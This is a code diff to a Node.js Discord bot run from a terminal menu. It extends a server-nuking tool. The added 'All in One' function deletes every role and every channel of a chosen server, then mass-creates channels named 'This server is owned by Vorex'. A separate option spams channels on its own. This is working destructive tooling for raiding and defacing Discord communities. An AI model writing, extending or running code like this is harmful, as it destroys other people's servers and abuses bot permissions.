@@ -165,18 +165,31 @@ async function startTerminalInterface() {
     }
     
     console.log(`\nSelected: ${selectedGuild.name}`);
-    console.log('\nAvailable commands:');
-    console.log('1. Delete all channels and categories');
-    console.log('2. Delete all roles');
     
-    const commandChoice = await askQuestion('\nSelect command (number): ');
-    
-    if (commandChoice === '1') {
-        await deleteAllChannels(selectedGuild);
-    } else if (commandChoice === '2') {
-        await deleteAllRoles(selectedGuild);
-    } else {
-        console.log('Invalid command selection!');
+    while (true) {
+        console.log('\nAvailable commands:');
+        console.log('1. Delete all channels and categories');
+        console.log('2. Delete all roles');
+        console.log('3. Create channels');
+        console.log('4. All in One');
+        console.log('5. Exit');
+        
+        const commandChoice = await askQuestion('\nSelect command (number): ');
+        
+        if (commandChoice === '1') {
+            await deleteAllChannels(selectedGuild);
+        } else if (commandChoice === '2') {
+            await deleteAllRoles(selectedGuild);
+        } else if (commandChoice === '3') {
+            await createChannels(selectedGuild);
+        } else if (commandChoice === '4') {
+            await allInOne(selectedGuild);
+        } else if (commandChoice === '5') {
+            console.log('Goodbye!');
+            break;
+        } else {
+            console.log('Invalid command selection!');
+        }
     }
     
     rl.close();
@@ -224,5 +237,66 @@ async function deleteAllRoles(guild) {
     }
     
     console.log('Role deletion completed!');
+}
+
+async function createChannels(guild) {
+    const channelCount = await askQuestion('How many channels to create? ');
+    const count = parseInt(channelCount);
+    
+    if (isNaN(count) || count <= 0) {
+        console.log('Invalid number!');
+        return;
+    }
+    
+    console.log(`Creating ${count} channels...`);
+    
+    for (let i = 1; i <= count; i++) {
+        try {
+            await guild.channels.create({
+                name: 'This server is owned by Vorex',
+                type: 0
+            });
+            console.log(`Created channel ${i}/${count}`);
+        } catch (error) {
+            console.log(`Failed to create channel ${i}: ${error.message}`);
+        }
+    }
+    
+    console.log('Channel creation completed!');
+}
+
+async function allInOne(guild) {
+    const channelCount = await askQuestion('How many channels to create after cleanup? ');
+    const count = parseInt(channelCount);
+    
+    if (isNaN(count) || count < 0) {
+        console.log('Invalid number!');
+        return;
+    }
+    
+    console.log('Starting All in One operation...');
+    
+    console.log('1. Deleting all roles...');
+    await deleteAllRoles(guild);
+    
+    console.log('2. Deleting all channels and categories...');
+    await deleteAllChannels(guild);
+    
+    if (count > 0) {
+        console.log(`3. Creating ${count} channels...`);
+        for (let i = 1; i <= count; i++) {
+            try {
+                await guild.channels.create({
+                    name: 'This server is owned by Vorex',
+                    type: 0
+                });
+                console.log(`Created channel ${i}/${count}`);
+            } catch (error) {
+                console.log(`Failed to create channel ${i}: ${error.message}`);
+            }
+        }
+    }
+    
+    console.log('All in One operation completed!');
 }
 
